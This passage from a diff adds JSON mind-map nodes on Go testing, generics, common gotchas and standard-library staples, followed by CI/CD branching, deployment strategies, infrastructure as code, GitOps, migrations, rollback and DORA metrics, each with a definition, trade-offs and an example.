+              "title": "**Definition:** Built-in `testing` package: table-driven tests with `t.Run`, microbenchmarks with `b.N`, native fuzzing with `testing.F` since 1.18.<br/>**Trade-offs:** Zero-dependency, fast, and ergonomic for almost everything, but assertion libraries (Testify) are usually added once tests get complex.<br/>**Application Example:** Table-driven `TestParse` with 30 cases via `for _, tc := range tests { t.Run(tc.name, func(t *testing.T) {…}) }`, plus `FuzzParse` with seed corpus for the same parser."
+            }
+          ]
+        },
+        {
+          "title": "Generics (1.18+)",
+          "children": [
+            {
+              "title": "**Definition:** Type parameters on functions and types: `func Map[T, U any](xs []T, f func(T) U) []U`.<br/>**Trade-offs:** Solves real boilerplate around containers and helpers, but Go's generics are deliberately limited (no specialisation, no operator overloading).<br/>**Application Example:** A generic `slices.Filter[T any](s []T, keep func(T) bool) []T` replacing four near-identical filter functions for different concrete types."
+            }
+          ]
+        },
+        {
+          "title": "Common gotchas (slice aliasing, defer eval, nil interface vs nil pointer)",
+          "children": [
+            {
+              "title": "**Definition:** Slice headers share underlying arrays (`s[1:3]` aliases `s`); `defer` evaluates **arguments** at the defer line, not at execution; a non-nil interface holding a nil pointer is **not nil** in `==`.<br/>**Trade-offs:** Idiomatic Go relies on these — appending to a sub-slice can clobber the parent — but they trip every newcomer at least once.<br/>**Application Example:** `var err *MyError = nil; var e error = err; e == nil // false` — the classic interview question that catches almost everyone the first time."
+            }
+          ]
+        },
+        {
+          "title": "Standard library staples (net/http, sync.{Mutex,WaitGroup,Pool}, encoding/json)",
+          "children": [
+            {
+              "title": "**Definition:** Production-quality building blocks: `net/http` (server + client), `sync.{Mutex, RWMutex, WaitGroup, Pool}`, `encoding/json` for marshaling.<br/>**Trade-offs:** Wide enough for most workloads — Go services often ship with **only stdlib** — but `encoding/json` reflection is slow and `net/http` has subtle defaults (timeouts!).<br/>**Application Example:** An HTTP service whose entire dependency footprint is the standard library: `net/http` for the server, `database/sql` for Postgres, `log/slog` for structured logs."
+            }
+          ]
+        }
+      ]
+    },
+    {
+      "title": "CI/CD",
+      "note": "Automating the path from commit to production with safety nets at every step.",
+      "children": [
+        {
+          "title": "CI fundamentals",
+          "children": [
+            {
+              "title": "**Definition:** Continuous Integration: every commit triggers an automated pipeline — checkout → install deps → build → test → package → publish artifact.<br/>**Trade-offs:** Catches integration breaks immediately and produces deployable artifacts on every green commit, but requires fast pipelines and a culture of fixing red builds first.<br/>**Application Example:** A GitHub Actions workflow on every push: checkout, restore dep cache, run `go test ./…`, build a multi-arch container, push to ECR tagged with the commit SHA."
+            }
+          ]
+        },
+        {
+          "title": "Branching strategies",
+          "note": "How code flows from a developer's machine to main.",
+          "children": [
+            {
+              "title": "Trunk-based development",
+              "children": [
+                {
+                  "title": "**Definition:** All developers commit to a single mainline (`main`) at least daily; long-lived branches are forbidden. Risky changes hide behind feature flags.<br/>**Trade-offs:** Eliminates merge hell and keeps the system continuously releasable, but demands a strong test suite and feature-flag discipline.<br/>**Application Example:** Google and Meta scale: thousands of engineers committing to one trunk daily; feature flags gate unfinished work in production."
+                }
+              ]
+            },
+            {
+              "title": "GitFlow",
+              "children": [
+                {
+                  "title": "**Definition:** Long-lived `develop` and `main`, plus `feature/*`, `release/*`, and `hotfix/*` branches with formal merge rules.<br/>**Trade-offs:** Maps cleanly to versioned releases and parallel maintenance, but heavy ceremony and merge complexity for fast-moving web apps.<br/>**Application Example:** An on-prem product shipping a tagged release every quarter, maintaining `release/2024.01` for hotfixes while `develop` keeps moving."
+                }
+              ]
+            },
+            {
+              "title": "GitHub Flow",
+              "children": [
+                {
+                  "title": "**Definition:** Lightweight: branch from `main`, open a PR, get reviews/CI, merge to `main`, deploy. No `develop` branch.<br/>**Trade-offs:** Simple and fits CD for SaaS, but assumes you can ship from `main` at any time — needs strong CI and feature flags.<br/>**Application Example:** A typical SaaS team: every PR runs CI + preview env, gets one approval, squash-merges to main, and triggers an automated production deploy."
+                }
+              ]
+            },
+            {
+              "title": "Release branches",
+              "children": [
+                {
+                  "title": "**Definition:** Cut a `release/x.y` branch when stabilising a version; only fixes flow into it, while `main` keeps moving forward.<br/>**Trade-offs:** Lets you ship a stable version while continuing to develop, but you pay the merge tax of cherry-picking fixes between branches.<br/>**Application Example:** A SDK team cutting `release/v3.2` to harden for a customer rollout while `main` already has v3.3 work; critical fixes cherry-picked to both."
+                }
+              ]
+            }
+          ]
+        },
+        {
+          "title": "Deployment strategies",
+          "note": "How a new version takes traffic — risk vs. operational complexity.",
+          "children": [
+            {
+              "title": "Recreate",
+              "children": [
+                {
+                  "title": "**Definition:** Stop the old version entirely, then start the new — guaranteed downtime during the swap.<br/>**Trade-offs:** Simplest possible strategy with no version-skew concerns, but the downtime makes it unacceptable for most production services.<br/>**Application Example:** A nightly batch processor with no live users, redeployed by stopping the old container and starting the new one once it's healthy."
+                }
+              ]
+            },
+            {
+              "title": "Rolling",
+              "children": [
+                {
+                  "title": "**Definition:** Replace instances of the old version with the new one a few at a time, keeping enough capacity online to serve traffic.<br/>**Trade-offs:** Zero-downtime by default and built into K8s/ECS, but you run mixed versions during the rollout — schemas and APIs must be backward-compatible.<br/>**Application Example:** A K8s `Deployment` with `maxSurge: 1, maxUnavailable: 0` rolling 30 pods one at a time over 5 minutes, with `readinessProbe` gating each new pod."
+                }
+              ]
+            },
+            {
+              "title": "Blue / Green",
+              "children": [
+                {
+                  "title": "**Definition:** Two parallel identical environments; new version goes to the idle one (\"green\"), traffic is switched at the LB once green is verified.<br/>**Trade-offs:** Instant rollback (flip traffic back to blue), at the cost of doubling the running fleet during the cutover and stateful systems being hard to duplicate.<br/>**Application Example:** An ALB with two target groups; deploys push to the inactive group, smoke tests run against it, then a target-group swap moves 100% of traffic in seconds."
+                }
+              ]
+            },
+            {
+              "title": "Canary",
+              "children": [
+                {
+                  "title": "**Definition:** Send a small percentage of traffic to the new version and monitor SLIs; ramp up gradually if it's healthy, roll back if not.<br/>**Trade-offs:** Catches bugs that only show under real traffic with limited blast radius, but requires good observability + automated rollback to be safe.<br/>**Application Example:** Argo Rollouts shifting 1% → 10% → 50% → 100% of `/checkout` traffic to v2 over 30 minutes, auto-aborting if `error_rate > 1%` or `p99 > 500ms`."
+                }
+              ]
+            },
+            {
+              "title": "Shadow / Mirror",
+              "children": [
+                {
+                  "title": "**Definition:** Production traffic is copied to the new version in parallel; responses from the shadow are **discarded**, so users see only the old version's response.<br/>**Trade-offs:** Risk-free way to test the new version under real load and data, but doubles backend cost and breaks for non-idempotent traffic (writes).<br/>**Application Example:** Mirroring 100% of the read traffic on `/search` to a new ranking service via Envoy `request_mirror_policies`, comparing latency/results offline before any real cutover."
+                }
+              ]
+            },
+            {
+              "title": "Feature flags",
+              "children": [
+                {
+                  "title": "**Definition:** Decouple deploy from release: ship code dark, then turn it on for users via a remote-controlled flag (per-user, per-tenant, per-region).<br/>**Trade-offs:** Enables trunk-based development, instant kill switches, and incremental rollouts, but flags become technical debt if not retired aggressively.<br/>**Application Example:** LaunchDarkly toggle gating a new pricing engine: deployed to all pods two weeks ago, enabled for 1% of traffic today, full rollout next week — kill switch one click away."
+                }
+              ]
+            }
+          ]
+        },
+        {
+          "title": "Environments",
+          "children": [
+            {
+              "title": "**Definition:** Distinct deploy targets — dev, staging, production — plus increasingly **ephemeral PR previews** for review and integration testing.<br/>**Trade-offs:** Catches issues at progressively higher fidelity, but environment drift (\"staging is different from prod\") is a constant operational tax.<br/>**Application Example:** A platform that spins up a per-PR environment via Terraform + ArgoCD on PR open, deletes it on close — reviewers click a unique URL to test the change."
+            }
+          ]
+        },
+        {
+          "title": "Infrastructure as Code",
+          "children": [
+            {
+              "title": "**Definition:** Provision and manage cloud resources by code (Terraform, Pulumi, CloudFormation) rather than clicks; state is version-controlled and reviewable.<br/>**Trade-offs:** Reproducible, auditable, and reviewable infrastructure, but state-file ownership and drift between code and reality are real operational concerns.<br/>**Application Example:** A monorepo with `terraform/` modules for VPC, EKS, RDS, etc.; PRs run `terraform plan` in CI and merging triggers `apply` against a remote state in S3 + DynamoDB."
+            }
+          ]
+        },
+        {
+          "title": "GitOps",
+          "children": [
+            {
+              "title": "**Definition:** Git is the single source of truth for desired cluster state; an in-cluster operator (ArgoCD, Flux) reconciles the live state to match.<br/>**Trade-offs:** Auditable change history and self-healing drift correction, but coupling deploy to git means broken git or operator outages block all deploys.<br/>**Application Example:** ArgoCD watching `infra-repo/clusters/prod/` and continuously reconciling — a developer's PR merging into the manifests triggers a deploy 30s later, fully tracked in git."
+            }
+          ]
+        },
+        {
+          "title": "DB migrations",
+          "children": [
+            {
+              "title": "**Definition:** Schema changes versioned with the code; **forward-only** migrations preferred, with the **expand-contract** pattern for breaking changes.<br/>**Trade-offs:** Keeps schema in step with code and reviewable as PRs, but breaking changes require multi-deploy choreography (add column → backfill → switch reads → drop column).<br/>**Application Example:** Adding a NOT NULL column without downtime: deploy 1 adds nullable col + backfill; deploy 2 makes app write it; deploy 3 makes it NOT NULL once 100% of rows are populated."
+            }
+          ]
+        },
+        {
+          "title": "Rollback strategies",
+          "children": [
+            {
+              "title": "**Definition:** How you undo a bad deploy: redeploy the previous artifact, switch traffic back (blue/green), abort canary, or `kubectl rollout undo`.<br/>**Trade-offs:** Fast rollback is the safety net that lets you ship aggressively, but stateful changes (DB migrations) often can't be cleanly rolled back.<br/>**Application Example:** A canary auto-aborting and `kubectl rollout undo deployment/api` shifting traffic back to the previous ReplicaSet within 60 seconds of an error-rate spike."
+            }
+          ]
+        },
+        {
+          "title": "DORA metrics",
+          "children": [
+            {
+              "title": "**Definition:** Four metrics from the DORA / *Accelerate* research: **Deployment frequency**, **Lead time for changes**, **Change failure rate**, **Mean time to restore (MTTR)**.<br/>**Trade-offs:** Empirically separates elite teams from low performers and is hard to game, but easy to misuse as a stick — context matters.<br/>**Application Example:** A platform team's quarterly review showing deployment frequency rising from weekly → daily, lead time falling from 4 days → 4 hours, CFR holding at 8% — the Accelerate \"high-performer\" band."
+            }
+          ]
+        }
+      ]
     }
   ]
 }
